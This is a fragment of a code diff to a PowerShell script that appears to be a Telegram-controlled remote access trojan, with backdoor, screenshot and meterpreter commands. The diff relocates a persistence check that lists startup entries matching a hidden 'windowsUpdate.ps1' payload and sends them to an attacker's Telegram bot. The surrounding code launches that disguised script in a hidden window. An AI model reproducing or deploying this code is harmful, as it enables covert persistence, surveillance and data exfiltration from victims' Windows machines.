@@ -30,6 +30,10 @@ function backdoor {
         $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
         Invoke-Expression -Command:$command 
         Stop-Process -Name "comandos" -Confirm -PassThru
+
+        # Check backdoor
+        $checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
 }
 
 function screenshot {
@@ -228,9 +232,6 @@ While ($DoNotExit)  {
       }
       "/backdoor $ipV4"  {
         backdoor
-        # Check backdoor
-        $checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
       }
       "/meterpreter $ipV4"  {
          
